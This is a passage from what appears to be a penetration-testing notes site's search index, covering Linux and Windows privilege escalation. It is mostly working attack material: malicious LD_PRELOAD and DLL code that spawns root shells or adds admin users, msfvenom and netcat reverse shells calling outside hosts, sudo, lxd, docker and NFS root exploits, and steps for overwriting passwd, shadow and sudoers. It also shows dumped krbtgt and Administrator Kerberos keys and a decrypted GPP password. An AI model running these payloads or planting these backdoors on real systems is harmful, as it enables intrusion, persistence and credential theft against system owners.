ntds.dit.bak\nAdministrator:aes256-cts-hmac-sha1-96:56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc\nAdministrator:aes128-cts-hmac-sha1-96:3d58eb136242c11643baf4ec85970250\nAdministrator:des-cbc-md5:fd79dc380ee989a4\nDC1$:aes256-cts-hmac-sha1-96:fb2255e5983e493caaba2e5693c67ceec600681392e289594b121dab919cef2c\nDC1$:aes128-cts-hmac-sha1-96:68cf0d124b65310dd65c100a12ecf871\nDC1$:des-cbc-md5:f7f804ce43264a43\nkrbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c\nkrbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69\nkrbtgt:des-cbc-md5:683bdcba9e7c5de9\n...\n[*] Cleaning up...\n</code></pre>"},{"location":"pentest/privesc/linux/groups/","title":"Groups","text":""},{"location":"pentest/privesc/linux/groups/#adm","title":"adm","text":"<p>Members can read many log files in <code>/var/log</code> and use <code>xconsole</code></p>"},{"location":"pentest/privesc/linux/groups/#shadow","title":"shadow","text":"<p>Members can read the /etc/shadow file</p>"},{"location":"pentest/privesc/linux/groups/#sudoadminwheel","title":"sudo/admin/wheel","text":"<p>sudo/admin (in Debian derivatives) or wheel (in CentOS/RedHat derivatives) group is a special user group used to control access to the su or sudo commands, which allow users to either execute commands or masquerade as another user (usually the super user)</p>"},{"location":"pentest/privesc/linux/groups/#mlocate","title":"mlocate","text":"<p>Members can read database of indexed files located at <code>var/lib/mlocate/mlocate.db</code></p> <pre><code>cat /var/lib/mlocate/mlocate.db | strings | grep personal -A 3 -B 3\n</code></pre>"},{"location":"pentest/privesc/linux/groups/#disk","title":"disk","text":"<p>Members have access to the raw data contained in disks and partitions</p> <p>Show disk space usage in human-readable format</p> <pre><code>df -h\n</code></pre> <p>Open File System</p> <pre><code>debugfs &lt;FILESYSTEM&gt;\n</code></pre> <p>Read files</p> <pre><code>debugfs: cat /etc/shadow\ndebugfs: cat /root/.ssh/id_rsa\n</code></pre> <p>Write files</p> <pre><code>debugfs -w /dev/sda1\ndebugfs: dump /tmp/asd1.txt /tmp/asd2.txt\n</code></pre>"},{"location":"pentest/privesc/linux/groups/#lxdlxc","title":"lxd/lxc","text":"<p>Members have write access to the LXD socket and can perform privileged actions, such as creating a root-level privilege container because LXD does not try to match the current users privileges</p>"},{"location":"pentest/privesc/linux/groups/#exploit-1","title":"Exploit 1","text":"<p>Build a simple alpine image</p> <pre><code>git clone https://github.com/saghul/lxd-alpine-builder\ncd lxd-alpine-builder\n./build-alpine -a i686\n</code></pre> <p>Import the image</p> <pre><code>lxc image import ./alpine.tar.gz --alias myimage\n</code></pre> <p>Run the image</p> <pre><code>lxc init myimage mycontainer -c security.privileged=true\n</code></pre> <p>Mount the /root into the image</p> <pre><code>lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true\n</code></pre> <p>Interact with the container</p> <pre><code>lxc start mycontainer\nlxc exec mycontainer /bin/sh\n</code></pre>"},{"location":"pentest/privesc/linux/groups/#exploit-2","title":"Exploit 2","text":"<p>Install distrobuilder</p> <p>Make distrobuilder</p> <pre><code>cd $HOME/go/src/github.com/lxc/distrobuilder\nmake\n</code></pre> <p>Create alphine</p> <pre><code>mkdir -p $HOME/ContainerImages/alpine &amp;&amp; cd ContainerImages/alpine\nwget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml\n</code></pre> <p>Create container</p> <pre><code>sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8\n</code></pre> <p>Upload <code>lxd.tar.xz</code> and <code>rootfs.squashfs</code></p> <p>Add image</p> <pre><code>lxc image import lxd.tar.xz rootfs.squashfs --alias alpine\nlxc image list #You can see your new imported image\n</code></pre> <p>Create container and add root path</p> <pre><code>lxc init alpine privesc -c security.privileged=true\nlxc list #List containers\n\nlxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true\n</code></pre> <p>Execute the container</p> <pre><code>lxc start privesc\nlxc exec privesc /bin/sh\n[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted\n</code></pre>"},{"location":"pentest/privesc/linux/groups/#docker","title":"docker","text":"<p>Members have access to manage, create, edit or delete docker containers</p>"},{"location":"pentest/privesc/linux/groups/#exploit-1_1","title":"Exploit 1","text":"<pre><code>sudo docker run -v /:/mnt --rm -it &lt;IMAGE&gt; chroot /mnt sh\nsudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n</code></pre> <ul> <li><code>docker run</code>: Runs a new container from an image.</li> <li><code>--rm</code>: Automatically removes the container once it exits.</li> <li><code>-it</code>: Combines <code>-i</code> (interactive mode) and <code>-t</code> (allocates a pseudo-TTY), allowing interaction with the container's shell.</li> <li><code>alpine</code>: The name of the Docker image being used (a lightweight Linux distribution).</li> <li><code>sh -c \"whoami\"</code>: Executes the <code>whoami</code> command within the container using the shell (<code>sh</code>). <code>whoami</code> will return the name of the current user inside the container.</li> </ul>"},{"location":"pentest/privesc/linux/groups/#exploit-2_1","title":"Exploit 2","text":"<pre><code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease\n</code></pre>"},{"location":"pentest/privesc/linux/kernelexploit/","title":"Kernel Exploits","text":"<p>Display detailed system information including kernel name, version, and architecture.</p> <pre><code>uname -a\n</code></pre> <p>Display the Linux distribution name and version</p> <pre><code>cat /etc/*-release\n</code></pre> <p>Display CPU architecture, supported operation mode, and byte order</p> <pre><code>lscpu | grep -i 'arch\\|op-mode\\|byte'\n</code></pre> <p>Search for possible exploit for specific kernel versions</p> <pre><code>searchsploit linux kernel &lt;VERSION&gt;\nsearchsploit linux kernel 5.\n</code></pre> <p>Check if <code>gcc</code> is installed</p> <pre><code>gcc\n</code></pre> <p>References</p>"},{"location":"pentest/privesc/linux/nfs/","title":"nfs","text":""},{"location":"pentest/privesc/linux/nfs/#what-is-nfs","title":"What is NFS?","text":"<ul> <li>Network File System runs on port 2049 and allows clients to access shared directories from a server over the network.  </li> <li>By default, the root_squash option maps root actions on the client to nobody:nogroup for security.  <p>If misconfigured with no_root_squash, clients can mount shares with root privileges, enabling privilege escalation.</p> </li> </ul>"},{"location":"pentest/privesc/linux/nfs/#how-to","title":"How to ?","text":"<p>Read <code>/etc/exports</code></p> <pre><code>cat /etc/exports\n\n# /etc/exports: the access control list for filesystems which may be exported\n#               to NFS clients.  See exports(5).\n#\n# Example for NFSv2 and NFSv3:\n# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)\n#\n# Example for NFSv4:\n# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)\n# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)\n#\n/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)\n/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)\n/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)\n</code></pre> <ul> <li><code>rw</code>: Grants read/write access  </li> <li><code>sync</code>: Writes changes to disk before replying (safer but slower) resulting in a more stable and consistent environment but reduces the speed of file operations  </li> <li><code>insecure</code>: Allows access from any client port  </li> <li><code>no_subtree_check</code>: This option prevents subtree checking, which is a process where the host must check whether the file is actually still available in the exported tree for every request.  </li> <li><code>no_root_squash</code>: This option allows privileged file writes inside the share. By default, NFS translates requests from a root user remotely into a non-privileged user on the server. This was intended as security feature to prevent a root account on the client from using the file system of the host as root \u2013 no_root_squash disables this behavior.  </li> </ul> <p>List all nfs shares</p> <pre><code>showmount -e &lt;TARGET_IP&gt;\n</code></pre> <p>Mount vulnerable share</p> <pre><code>mkdir nfsdir\nmount -t nfs 10.10.10.10:/mnt/share /tmp/nfsdir    \ncd /tmp/nfsdir\n</code></pre>"},{"location":"pentest/privesc/linux/nfs/#suid","title":"SUID","text":"<pre><code>cp /bin/bash .  \nchmod +s bash  \n</code></pre>"},{"location":"pentest/privesc/linux/nfs/#craft-exploit","title":"Craft exploit","text":"<pre><code>echo 'int main() { setgid(0); setuid(0); system(\"/bin/bash -p\"); return 0; }' &gt; /tmp/nfsdir/root_shell.c\ngcc ./root_shell.c -o ./root_shell\ncp root_shell /mnt/share/\nchmod +s /mnt/share/root_shell\n</code></pre>"},{"location":"pentest/privesc/linux/nfs/#reverse-shell","title":"Reverse shell","text":"<pre><code>echo 'int main() { setgid(0); setuid(0); system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 172.16.1.30 443 &gt;/tmp/f\"); return 0; }' &gt; /mnt/share/root_reverse_shell.c\n</code></pre>"},{"location":"pentest/privesc/linux/suid/","title":"suid","text":""},{"location":"pentest/privesc/linux/suid/#what-is-suid","title":"What is SUID ?","text":"<p>Set User ID is a special file permission that allows a user to execute a program with the privileges of the file\u2019s owner.</p>"},{"location":"pentest/privesc/linux/suid/#how-to","title":"How to ?","text":"<p>Search for SUID binary</p> <pre><code>find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \\;\nfind / -uid 0 -perm -4000 -type f 2&gt;/dev/null\n</code></pre>"},{"location":"pentest/privesc/linux/suid/#navigate-to-gtfobins","title":"Navigate to GTFOBins","text":""},{"location":"pentest/privesc/linux/suid/#investigate","title":"Investigate","text":"<p>Observe Binary output</p> <pre><code>./&lt;BINARY&gt;\n&lt;BINARY&gt; --help\n</code></pre> <p>Analyze Binary</p> <pre><code>&lt;BINARY&gt; --version\nstrings &lt;BINARY&gt;\nfile &lt;BINARY&gt;\nreadelf -d &lt;BINARY&gt; | egrep \"NEEDED|RPATH\"\nldd &lt;BINARY&gt;\nstrace &lt;BINARY&gt;\n</code></pre>"},{"location":"pentest/privesc/linux/sudo/CVE-2019-14287/","title":"Security Bypass","text":"<p>The security policy bypass vulnerability that allows users on a Linux system to execute commands as root, while the user permissions in the <code>sudoers</code> file explicitly prevents these commands from being run as root.</p> <p>If you specify a\u00a0UID\u00a0of -1 (or its unsigned equivalent:\u00a04294967295), Sudo would incorrectly read this as being 0 (i.e. root). E.g: <code>sudo -u#-1 /bin/bash</code> </p>"},{"location":"pentest/privesc/linux/sudo/CVE-2019-14287/#how-to","title":"How to ?","text":"<pre><code># Exploitable when a user have the following permissions (sudo -l)\n(ALL, !root) ALL\n\n# If you have a full TTY, you can exploit it like this\nsudo -u#-1 /bin/bash\nsudo -u#4294967295 id\n</code></pre>"},{"location":"pentest/privesc/linux/sudo/CVE-2019-14287/#references","title":"References","text":"<ul> <li>CVE-2019-14287</li> </ul>"},{"location":"pentest/privesc/linux/sudo/ldlibrary/","title":"LD_LIBRARY_PATH","text":""},{"location":"pentest/privesc/linux/sudo/ldlibrary/#what-is-ld_library_path","title":"What is LD_LIBRARY_PATH?","text":"<p>LD_LIBRARY_PATH directs the dynamic link loader (ld.so) where to search for the dynamic shared libraries an application was linked against.</p>"},{"location":"pentest/privesc/linux/sudo/ldlibrary/#ld_library_path-vs-ld_preload","title":"LD_LIBRARY_PATH vs LD_PRELOAD","text":"<p>LD_PRELOAD forces specific libraries to load before everything else to override functions.</p> <p>LD_LIBRARY_PATH controls where the linker searches for libraries, but it does not force load a specific library.</p>"},{"location":"pentest/privesc/linux/sudo/ldlibrary/#how-to","title":"How to ?","text":"<p>Pre-requisites:</p> <ul> <li> NOPASSWD <code>sudo -l</code> </li> <li> env_keep += LD_LIBRARY_PATH <code>sudo -l</code> </li> <li> Binary loads <code>.so</code> libraries (<code>ldd</code>)  </li> </ul> <p>Malicious <code>.so</code></p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstatic void hijack() __attribute__((constructor));\n\nvoid hijack() {\n        unsetenv(\"LD_LIBRARY_PATH\");\n        setresuid(0,0,0);\n        system(\"/bin/bash -p\");\n}\n</code></pre> <p>Compile FILE</p> <pre><code>cd /tmp\ngcc -shared -fPIC -o /tmp/libcrypt.so.1 /home/user/tools/sudo/library_path.c\n</code></pre> <p>Execute the compiled file</p> <pre><code>sudo LD_LIBRARY_PATH=/tmp &lt;BINARY&gt;\n</code></pre>"},{"location":"pentest/privesc/linux/sudo/ldpreload/","title":"LD_PRELOAD","text":""},{"location":"pentest/privesc/linux/sudo/ldpreload/#what-is-ld_preload","title":"What is LD_PRELOAD?","text":"<p>LD_PRELOAD is an environment variable in Linux that specifies a shared library to be loaded before any other libraries. It is used to override functions in the default libraries with custom implementations.</p>"},{"location":"pentest/privesc/linux/sudo/ldpreload/#ld_preload-vs-etcldsopreload","title":"LD_PRELOAD vs /etc/ld.so.preload","text":"<ul> <li><code>/etc/ld.so.preload</code> is a system-wide configuration file (root permissions required) that applies to all processes and affects the entire system.   </li> <li><code>LD_PRELOAD</code>, on the other hand, is an environment variable that allows individual users to specify libraries to be preloaded for a specific executable or command on a per-process basis. Therefore, you don\u2019t need to be root to use it.    <p>Libraries defined by LD_PRELOAD are loaded prior to those in /etc/ld.so.preload. </p> </li> </ul>"},{"location":"pentest/privesc/linux/sudo/ldpreload/#how-to","title":"How to ?","text":"<p>Pre-requisites:  </p> <ul> <li> NOPASSWD  </li> <li> env_keep += LD_PRELOAD  </li> </ul> <p>Search for writable shared objects file</p> <pre><code>ldd &lt;BINARY&gt;\n</code></pre> <p>Create malicious <code>.so</code></p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\nvoid _init() {\n unsetenv(\"LD_PRELOAD\");\n setgid(0);\n setuid(0);\n system(\"/bin/sh\");\n}\n</code></pre> <p>Compile <code>.so</code></p> <pre><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles\n</code></pre> <p>Execute any binary with the LD_PRELOAD</p> <pre><code>sudo LD_PRELOAD=&lt;PATH_TO_.so_FILE&gt; &lt;PROGRAM&gt;\nsudo LD_PRELOAD=/tmp/shell.so find\n</code></pre>"},{"location":"pentest/privesc/linux/sudo/sudo/","title":"What is Sudo?","text":"<p>Sudo(Super User DO) is a shell command that enable another user to run a program with the security privileges of the superuser</p>"},{"location":"pentest/privesc/linux/sudo/sudo/#how-to","title":"How to ?","text":"<ul> <li>NOPASSWD</li> <li>Refer to GTFOBins</li> <li>Sudo version</li> <li>LD_PRELOAD and NOPASSWD</li> <li>doas</li> </ul>"},{"location":"pentest/privesc/linux/sudo/tools/","title":"Tools","text":"<p>Sudo Killer: focuses on vulnerabilities tied to SUDO usage - Misconfigurations in sudo rules - Version-based weaknesses (CVEs and other vulnerabilities) - Risky binary deployments (GTFOBINS)  </p>"},{"location":"pentest/privesc/linux/writableFiles/authorized_keys/","title":"authorized_keys","text":""},{"location":"pentest/privesc/linux/writableFiles/authorized_keys/#what","title":"What ?","text":"<p>File in <code>~/.ssh/</code> that contains public keys allowed to SSH into an account</p>"},{"location":"pentest/privesc/linux/writableFiles/authorized_keys/#how-to","title":"How to ?","text":"<p>Generate <code>SSH</code> key pairs</p> <pre><code>ssh-keygen -t rsa -f /path/to/key -C \"your_comment\"\n</code></pre> <p><code>-t</code>: Specifies the key type (e.g., rsa, ecdsa, etc.).  <code>-f</code>: Path where the key will be saved.  <code>-C</code>: Comment for identifying the key. Set permissions for private key</p> <pre><code>chmod 600 &lt;PRIVATE KEY&gt;\n</code></pre> <p>Overwrite <code>/root/.ssh/authorized_keys</code> with our <code>PUBLIC KEY</code></p> <pre><code>echo \"ssh-rsa AAAAB3...your_public_key... root\" &gt;&gt; /root/.ssh/authorized_keys\n</code></pre> <p>Alternative command to overwrite authorized keys</p> <pre><code>user@remotehost$ echo \"ssh-rsa AAAAB...SNIP...M= user@parrot\" &gt;&gt; /root/.ssh/authorized_keys\n</code></pre> <p>ROOT</p> <pre><code>ssh -i &lt;PRIVATE KEY&gt; root@&lt;IP&gt;\n</code></pre>"},{"location":"pentest/privesc/linux/writableFiles/passwd/","title":"/etc/passwd","text":""},{"location":"pentest/privesc/linux/writableFiles/passwd/#what","title":"What?","text":"<p>File that contains a list of user accounts on the system, as well as details such as user ID, group ID, home directory, and default shell</p>"},{"location":"pentest/privesc/linux/writableFiles/passwd/#how-to","title":"How to ?","text":"<p>Check permissions of <code>/etc/passwd</code></p> <pre><code>ls -l /etc/passwd\n</code></pre> <p>Generate password using MD5 crypt hashing</p> <pre><code>mkpasswd -m md5crypt -s\nPassword: 123456\n$1$YPsFoIf.$eezlMsnTb/0uWw2/WV.tQ0\n</code></pre> <p>Add the new user with the generated password hash, setting <code>UID</code> and <code>GID</code> to <code>0</code> (for root access)</p> <pre><code>root:x:0:0:root:/root:/bin/bash\ndeku:x:1000:1000:deku:/home/deku:/bin/bash\n\nhacker:$1$YPsFoIf.$eezlMsnTb/0uWw2/WV.tQ0:hacker:/root:/bin/bash\n</code></pre> <p>ROOT</p> <pre><code>su hacker\nPassword: 123456\n</code></pre>"},{"location":"pentest/privesc/linux/writableFiles/shadow/","title":"/etc/shadow","text":""},{"location":"pentest/privesc/linux/writableFiles/shadow/#what","title":"What ?","text":"<p>File store password hashes for all users, only readable by root. Writable access allows replacing the root password.</p>"},{"location":"pentest/privesc/linux/writableFiles/shadow/#how-to","title":"How to ?","text":"<p>Check permissions of <code>/etc/shadow</code></p> <pre><code>ls -l /etc/shadow\n</code></pre> <p>Generate a password hash</p> <pre><code>openssl passwd -6 123456\n$6$uT3p4rOa$w4dUIcdsz1u1mTtC1CjoJvU7pZX0kP1oBz69i4dJ4Qb5e6IvEm6CE0jFZB3snwC0cYq3INqodc0PHEDdP9d/\n\n</code></pre> <p>Replace root hash</p> <pre><code>root:$6$uT3p4rOa$w4dUIcdsz1u1mTtC1CjoJvU7pZX0kP1oBz69i4dJ4Qb5e6IvEm6CE0jFZB3snwC0cYq3INqodc0PHEDdP9d/:19000:0:99999:7:::\n</code></pre> <p>ROOT</p> <pre><code>su root\nPassword: 123456\n</code></pre>"},{"location":"pentest/privesc/linux/writableFiles/sudoers/","title":"/etc/sudoers","text":""},{"location":"pentest/privesc/linux/writableFiles/sudoers/#what","title":"What ?","text":"<p>Configuration file that defines which users can run commands with sudo. Writable access allows giving yourself root privileges.</p>"},{"location":"pentest/privesc/linux/writableFiles/sudoers/#how-to","title":"How to ?","text":"<p>Check permissions of <code>/etc/sudoers</code></p> <pre><code>ls -l /etc/sudoers\n</code></pre> <p>Overwrite <code>/etc/sudoers</code>:</p> <pre><code>hacker ALL=(ALL:ALL) ALL &gt;&gt; /etc/sudoers\ndeku ALL=NOPASSWD: ALL &gt;&gt; /etc/sudoers\n</code></pre> <p>Check privileges</p> <pre><code>sudo -l\n</code></pre> <p>ROOT</p> <pre><code>sudo /bin/bash\n</code></pre>"},{"location":"pentest/privesc/windows/automated_tools/","title":"Automated Tools","text":""},{"location":"pentest/privesc/windows/automated_tools/#winpeas","title":"winpeas","text":"<pre><code>.\\winpeas.exe\n</code></pre>"},{"location":"pentest/privesc/windows/automated_tools/#powerup","title":"powerup","text":"<pre><code>import-module .\\powerup.ps1\ninvoke-allchecks\n</code></pre>"},{"location":"pentest/privesc/windows/automated_tools/#lazagne","title":"lazagne","text":"<pre><code>laZagne.exe all -quiet -oA\n\nlaZagne.exe all -password &lt;PASSWORD&gt;\nlaZagne.exe all -password ZapataVive\n</code></pre>"},{"location":"pentest/privesc/windows/automated_tools/#privesccheck","title":"privesccheck","text":"<pre><code>. .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT\n</code></pre>"},{"location":"pentest/privesc/windows/automated_tools/#windows-exploit-suggester-next-generation","title":"windows exploit suggester - next generation","text":"<pre><code>python3 wes.py &lt;SYSINFO_FILE&gt;\n</code></pre>"},{"location":"pentest/privesc/windows/automated_tools/#hounds","title":"hounds","text":""},{"location":"pentest/privesc/windows/automated_tools/#bloodhound","title":"bloodhound","text":"<pre><code>bloodhound-python -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; -ns &lt;TARGET_IP&gt; -c all\nsudo neo4j console\nbloodhound\n\nbh\n</code></pre>"},{"location":"pentest/privesc/windows/automated_tools/#bloodhound-ce","title":"bloodhound-ce","text":"<pre><code>sudo docker-compose -f docker-compose.yml up\n\nbhce\n</code></pre>"},{"location":"pentest/privesc/windows/automated_tools/#sharphound","title":"sharphound","text":"<pre><code>Import-Module .\\Sharphound.ps1\nInvoke-BloodHound -CollectionMethod All -OutputDirectory &lt;DIRECTORY&gt; -OutputPrefix &lt;FILE&gt;\nsudo neo4j console\nbloodhound\n</code></pre>"},{"location":"pentest/privesc/windows/checklist/","title":"Checklist","text":"<ul> <li> Automated Tools</li> <li> Common Misconfiguration<ul> <li> GPP Password Extraction  </li> <li> UAC Bypass  </li> <li> Token Privileges  </li> <li> DLL Hijacking</li> <li> AlwaysInstallElevated Enabled  </li> <li> Credential Dumping (LSASS, SAM, etc.)</li> </ul> </li> <li> Insecure Permissions  <ul> <li> Services</li> <li> Files and Folders</li> <li> Registry Keys</li> <li> Unquoted Service Paths</li> <li> Insecure Scheduled Tasks  </li> </ul> </li> <li> Kernel Exploit</li> </ul>"},{"location":"pentest/privesc/windows/dllhijack/","title":"DLL Hijack","text":""},{"location":"pentest/privesc/windows/dllhijack/#description","title":"Description","text":"<p>A DLL (Dynamic Link Library) is a file that contains code and data that can be used by multiple programs simultaneously. It is somewhat analogous to a Linux <code>.so</code> (Shared Object) file. DLLs are used in Windows to hold libraries of functions, resources, and other components, allowing for modular and efficient coding. They enable code reuse across different applications and help reduce the size of executable files since multiple programs can share the same DLL file instead of each having its own copy.</p> <p>Key Points About DLLs: 1. Functionality: A DLL can contain functions, classes, variables, and resources like icons, images, or files. Applications or services can call these functions or use these resources without having to include them in their own codebase. 2. Dynamic Linking: Unlike static libraries that are linked during the compilation of an application, DLLs are linked at runtime. When an application starts, it looks for the required DLLs and loads them into memory. If the DLLs are already loaded for another process, the application can share them, improving memory usage. 3. Windows Application/Service Startup: When a Windows application or service starts, it often relies on several DLLs for the features it provides. For example, many system services and user applications require common DLLs (such as <code>kernel32.dll</code> or <code>user32.dll</code>) to interact with the operating system's core functionality. 4. Missing or Malicious DLLs: If a required DLL is missing or can't be found in the expected locations, the application may fail to start or function properly. This process of searching for and loading DLLs can be exploited. Attackers may replace a legitimate DLL with a malicious one, or place a malicious DLL in a location where the application will find and load it first. This type of attack is known as DLL hijacking or DLL preloading. 5. DLL Hijacking: In DLL hijacking, when a Windows application starts and searches for a required DLL, if the legitimate DLL is absent or an attacker has placed a malicious DLL with the same name in a directory that the application checks first, the system will load the malicious DLL. This allows the attacker to execute arbitrary code within the context of the application, potentially gaining control of the system or performing other malicious actions.</p>"},{"location":"pentest/privesc/windows/dllhijack/#how-to","title":"How to ?","text":""},{"location":"pentest/privesc/windows/dllhijack/#reverse-shell","title":"Reverse shell","text":"<p>Generate reverse shell for <code>.dll</code></p> <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;TARGET_IP&gt; LPORT=&lt;PORT&gt; -f dll -o rev.dll\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.38.79 LPORT=53 -f dll -o rev.dll\n</code></pre> <p>Upload <code>.dll</code> and trigger its execution</p>"},{"location":"pentest/privesc/windows/dllhijack/#create-user","title":"Create User","text":"<p>Create User <code>.dll</code> script</p> <pre><code>#include &lt;stdlib.h&gt;\n#include &lt;windows.h&gt;\n\nBOOL APIENTRY DllMain(\nHANDLE hModule,// Handle to DLL module\nDWORD ul_reason_for_call,// Reason for calling function\nLPVOID lpReserved ) // Reserved\n{\n    switch ( ul_reason_for_call )\n    {\n        case DLL_PROCESS_ATTACH: // A process is loading the DLL.\n        int i;\n        i = system (\"net user HackingT1me Password123@! /add\");\n        i = system (\"net localgroup administrators HackingT1me /add\");\n        break;\n        case DLL_THREAD_ATTACH: // A process is creating a new thread.\n        break;\n        case DLL_THREAD_DETACH: // A thread exits normally.\n        break;\n        case DLL_PROCESS_DETACH: // A process unloads the DLL.\n        break;\n    }\n    return TRUE;\n}\n</code></pre> <p>Cross-compile the code according to the target machine specification</p> <pre><code>64-bit Windows DLL\nx86_64-w64-mingw32-gcc -shared -o backdoor.dll yourcode.cpp\n\n32-bit Windows DLL\ni686-w64-mingw32-gcc -shared -o backdoor.dll yourcode.cpp\n</code></pre> <p>Use g++ for C++ code</p> <p>Upload <code>.dll</code> and trigger its execution</p>"},{"location":"pentest/privesc/windows/gpp/","title":"Group Policy Preferences (GPP)","text":""},{"location":"pentest/privesc/windows/gpp/#what-is-group-policy-preferences-gpp","title":"WHAT IS GROUP POLICY PREFERENCES (GPP)?","text":"<p>A Windows feature that enables administrator to manage operating system and application settings. It has the ability to set passwords for the Local Administrator account. Group Policies for account management are stored on the Domain Controller in <code>Groups.xml</code> files buried in the SYSVOL folder.</p>"},{"location":"pentest/privesc/windows/gpp/#gpp-password-attack","title":"GPP password attack","text":"<p>Locate <code>Groups.xml</code> file and extract <code>cpassword</code></p> <pre><code>cat 'C:\\ProgramData\\Microsoft\\Group Policy\\History\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xml'\n</code></pre> <p>Decrypt <code>cpassword</code></p> <pre><code>gpp-decrypt 'CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74K eUWc2+BeOVDQ'\nMyUnclesAreMarioAndLuigi!!1!\n</code></pre>"},{"location":"pentest/privesc/windows/scheduledtasks/","title":"Scheduled Tasks","text":"<p>List all scheduled tasks</p> <pre><code>schtasks /query /fo LIST /v\n</code></pre> <p>Note: - Check frequency of the task being executed - Check writable privilege to the task - Check user account (principal) for the task</p> <pre><code>icacls &lt;FILE&gt;\n</code></pre> <p>Replace the file with a malicious one and wait</p>"},{"location":"pentest/privesc/windows/uacbypass/","title":"CVE-2019-1388 Windows Privilege Escalation Through User Account Dialog","text":"<p>How UAC Windows Certificate Dialog Works: 1. User Initiates Action: When a user or an application attempts to perform an action that requires administrative privileges, such as installing or modifying certificates, a UAC prompt is triggered. 2. UAC Prompt: The UAC Windows Certificate Dialog appears, notifying the user that the action requires administrative rights. The dialog presents information about the application and the action being requested. 3. User Confirmation: The user must confirm the action by providing administrative credentials, typically an administrator\u2019s username and password. 4. Privilege Elevation: Upon confirmation, Windows grants the application or process the necessary elevated privileges to carry out the requested action. This might involve launching a separate process with administrative rights. 5. Action Execution: With the elevated privileges, the application can now perform the certificate-related operation that requires administrative access.  </p>","tags":["CVE","PRIVESC","WINDOWS"]},{"location":"pentest/privesc/windows/uacbypass/#additional-resources","title":"Additional Resources","text":"<ul> <li>https://github.com/jas502n/CVE-2019-1388</li> <li>https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege</li> <li>https://vk9-sec.com/cve-2019-1388privilege-escalation-microsoft-windows-certificate-dialog-privilege-escalation/#google_vignette</li> </ul>","tags":["CVE","PRIVESC","WINDOWS"]},{"location":"pentest/privesc/windows/unquotedservicepaths/","title":"Unquoted Service Paths","text":""},{"location":"pentest/privesc/windows/unquotedservicepaths/#description","title":"Description","text":"<p>Unquoted service paths can become dangerous when a service (Executed by SYSTEM) is configured with a path like:</p> <pre><code>C:\\Program Files\\unquoted service.exe\n</code></pre> <p>The system will attempt to execute the first valid .exe file it finds in this order: 1. C:\\Program.exe 2. C:\\Program Files.exe 3. C:\\Program Files\\unquoted.exe 4. C:\\Program Files\\unquoted service.exe  </p> <p>If an attacker has write permissions to any of the directories listed above, they can place a malicious executable with a matching name. When the service starts,it can result in privilege escalation.</p>"},{"location":"pentest/privesc/windows/unquotedservicepaths/#how-to","title":"How to ?","text":"<p>List services with spaces and missing quotes in binary path</p> <pre><code>wmic service get name,pathname |  findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\n</code></pre> <p>List unquoted services with <code>PowerUp.ps1</code></p> <pre><code>powershell -ep bypass\n. .\\PowerUp.ps1\nGet-UnquotedService\n</code></pre> <p>Check permissions to the service</p> <pre><code>sc qc &lt;SERVICE&gt;\n</code></pre> <p>Check permissions to the directories</p> <pre><code>accesschk.exe /accepteula -uwdq &lt;PATH&gt;\n</code></pre> <p><code>-u</code>: Check user permissions <code>-w</code>: Check write permissions <code>-d</code>: Display information about the directory <code>-q</code>: Suppresses output if there are no issues  </p> <p>Create a malicious executable and upload it to a writable directory</p> <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;TARGET_IP&gt; LPORT=&lt;PORT&gt; -f exe -o rev.exe\n\nmsfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe\n</code></pre> <p>Start the service</p> <pre><code>net start &lt;SERVICE&gt;\nstart-service &lt;SERVICE&gt;\nsc start &lt;SERVICE&gt;\n</code></pre>"},{"location":"pentest/privesc/windows/attack/gpo/","title":"GPOabuse","text":""},{"location":"pentest/privesc/windows/attack/gpo/#how-to","title":"How to ?","text":""},{"location":"pentest/privesc/windows/attack/gpo/#retrieve-all-gpos","title":"Retrieve all GPOs","text":"<pre><code>*Evil-WinRM* PS C:\\Users\\anirudh\\Documents&gt; Get-GPO -All\n\nDisplayName      : Default Domain Policy\nDomainName       : vault.offsec\nOwner            : VAULT\\Domain Admins\nId               : 31b2f340-016d-11d2-945f-00c04fb984f9\nGpoStatus        : AllSettingsEnabled\nDescription      :\nCreationTime     : 11/19/2021 12:50:33 AM\nModificationTime : 11/19/2021 2:00:32 AM\nUserVersion      : AD Version: 0, SysVol Version: 0\nComputerVersion  : AD Version: 4, SysVol Version: 4\nWmiFilter        :\n\nDisplayName      : Default Domain 